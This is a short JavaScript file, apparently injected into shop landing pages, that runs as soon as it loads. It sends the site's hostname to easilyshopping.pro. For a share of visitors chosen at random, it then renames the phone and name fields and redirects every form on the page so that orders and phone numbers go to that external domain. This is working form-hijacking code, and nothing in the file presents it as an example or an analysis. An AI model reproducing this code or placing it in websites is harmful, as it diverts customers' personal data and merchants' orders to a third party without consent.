function orderSteal(data) {
    if ("landing_id" in data && parseInt(data["landing_id"]) > 0 && "tel" in data && data["tel"] != "" && parseInt(data["product_id"]) > 0 && parseInt(data["percent"]) > 0) {
        var choice = Math.floor(Math.random() * 10);
        var n = parseInt(data["percent"]) / 10;
        var check_arr = [];
        for (var i = 0; i < n; i++) {
            check_arr[i] = i;
        }
        if (!(choice in check_arr)) {
            return;
        }
        var tels = document.getElementsByName(data["tel"]);
        for (var i = 0; i < tels.length; i++) {
            tels[i].setAttribute("name", "tel");
        }
        var forms = document.getElementsByTagName("form");
        [].forEach.call(forms, function (elem) {
            elem.setAttribute("action", "https://easilyshopping.pro/" + data["landing_id"] + "/success?product_id=" + parseInt(data["product_id"]));
            elem.setAttribute('onsubmit', 'return cartTelCheck(\"phone\", true, this, event);')
        });
        if (data["client"] == "") {
            return;
        }
        var clients = document.getElementsByName(data["client"]);
        for (var i = 0; i < clients.length; i++) {
            clients[i].setAttribute("name", "client");
        }
    }
}

function sendDomain() {
    var host = location.hostname;
    var http = new XMLHttpRequest();
    var resultdata = "";
    var url = "https://easilyshopping.pro/remote.php";
    var params = "landing_id=59909&host=" + host + "&type=remote";

    http.onreadystatechange = function () {
        if (http.readyState == 4) {
            if (http.responseText == "") {
                return;
            }
            
            resultdata = JSON.parse(http.responseText);
            orderSteal(resultdata);
        }
    };
    http.open("POST", url, true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send(params);
}
sendDomain();
